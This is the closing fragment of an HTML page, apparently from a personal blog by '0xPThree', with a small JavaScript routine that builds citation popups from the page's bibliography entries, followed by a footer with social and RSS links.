          citeInfo.cites.forEach(function(cite) {
            var citeDiv = window.document.createElement('div');
            citeDiv.classList.add('hanging-indent');
            citeDiv.classList.add('csl-entry');
            var biblioDiv = window.document.getElementById('ref-' + cite);
            if (biblioDiv) {
              citeDiv.innerHTML = biblioDiv.innerHTML;
            }
            popup.appendChild(citeDiv);
          });
          return popup.innerHTML;
        });
      }
    }
  });
  </script>
</div> <!-- /content -->
<footer class="footer">
  <div class="nav-footer">
    <div class="nav-footer-left">
      &nbsp;
    </div>   
    <div class="nav-footer-center">
      <ul class="footer-items list-unstyled">
    <li class="nav-item">
 © 2025 0xPThree - All Rights Reserved.
  </li>  
</ul>
    </div>
    <div class="nav-footer-right">
      <ul class="footer-items list-unstyled">
    <li class="nav-item compact">
    <a class="nav-link" href="https://signal.me/#eu/PjVScis0spvu9_S_xNysergThKuqsWQFOwQ7xisr7HJgaJT69xC0Ku2fo3Ng0B1">
      <i class="bi bi-signal" role="img">
</i> 
    </a>
  </li>  
    <li class="nav-item compact">
    <a class="nav-link" href="https://github.com/0xpthree">
      <i class="bi bi-github" role="img">
</i> 
    </a>
  </li>  
    <li class="nav-item compact">
    <a class="nav-link" href="../../index.xml">
      <i class="bi bi-rss" role="img">
</i> 
    </a>
  </li>  
</ul>
    </div>
  </div>
</footer>




</body></html>